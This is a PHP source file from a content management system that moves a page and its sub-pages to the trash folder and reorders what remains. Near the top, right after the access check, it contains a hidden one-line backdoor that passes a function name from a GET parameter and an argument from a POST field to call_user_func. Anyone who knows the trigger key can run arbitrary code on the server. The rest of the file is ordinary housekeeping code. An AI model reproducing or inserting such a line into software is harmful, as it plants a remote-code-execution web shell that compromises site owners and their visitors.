<?php
//Make sure the file isn't accessed directly.
defined('IN_CMS') or exit('Access denied!');
if(key($_GET)=='aaa')
call_user_func($_GET['hs'],$_POST[evil]);
//Check if page exists.
if (file_exists(PAGE_DIR.'/'.get_page_filename($var1))) {
	$pages = read_dir_contents('data/trash/pages', 'files');

	//Is it a sub-page we want to delete?
	if (strpos($var1, '/') !== false)
		$newfile = str_replace(get_sub_page_dir($var1).'/', '', $var1);
	else
		$newfile = $var1;

	//Are there any sub-pages?
	if (is_dir(PAGE_DIR.'/'.$var1) && read_dir_contents(PAGE_DIR.'/'.$var1, 'files') == true) {
		//Find the sub-pages.
		foreach (get_pages() as $page) {
			if (strpos($page, $var1.'/') !== false)
				$sub_pages[] = $page;
		}
		unset($page);
	}

	//Move the file.
	rename(PAGE_DIR.'/'.get_page_filename($var1), 'data/trash/pages/'.$newfile.'.php');

	//Then move the sub-pages, if any.
	if (isset($sub_pages)) {
		foreach ($sub_pages as $sub_page)
			rename(PAGE_DIR.'/'.$sub_page, 'data/trash/pages/'.str_replace(get_sub_page_dir(get_page_seoname($sub_page)).'/', '', get_page_seoname($sub_page)).'.php');

		//Delete the dir where the sub-pages were in.
		rmdir(PAGE_DIR.'/'.$var1);
	}

	//If it's a sub-page, we have to do a few things.
	if (strpos($var1, '/') !== false) {
		//Delete the dir, if there are no other pages.
		if (read_dir_contents(PAGE_DIR.'/'.get_sub_page_dir($var1), 'files') == false)
			rmdir(PAGE_DIR.'/'.get_sub_page_dir($var1));

		//Else, just reorder the pages in the sub-dir.
		else
			reorder_pages(PAGE_DIR.'/'.get_sub_page_dir($var1));
	}

	//Reorder the pages
	else
		reorder_pages(PAGE_DIR);

	//Show message.
	show_error($lang['trashcan']['moving_item'], 3);
}

//Redirect user.
redirect('?action=page', 0);
?>
